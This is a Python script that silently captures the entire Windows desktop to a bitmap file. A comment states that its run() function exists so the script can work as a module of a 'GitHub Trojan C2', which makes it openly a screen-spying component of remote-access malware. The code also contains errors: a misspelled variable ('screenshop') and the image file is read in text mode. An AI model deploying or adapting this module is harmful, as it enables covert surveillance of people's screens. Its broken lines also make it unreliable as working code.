import base64
import win32api
import win32con
import win32gui
import win32ui

def get_dimensions(): # Determine the size of the screen.
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top =  win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot(name='screenshot'):
    hdesktop = win32gui.GetDesktopWindow() # Acquire handle for entire desktop.
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop) # Create a device context using GetWindowDC.
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC() # Create a memory based device context to store image before writing bitmap bytes to a file.

    screenshot = win32ui.CreateBitmap() # Create bitmap object.
    screenshop.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot) # Sets the memory-based device context to point at the bitmap object that we capture.
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY) # Take a bit-for-bit copy of desktop, storing in mem_dc.
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp') # Write image to a file.

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def run(): # This run function allows us to use the script as a module for our GitHub Trojan C2.
    screenshot()
    with open('screenshot.bmp') as f:
        img = f.read()
    return img

if __name__ == "__main__":
    screenshot()
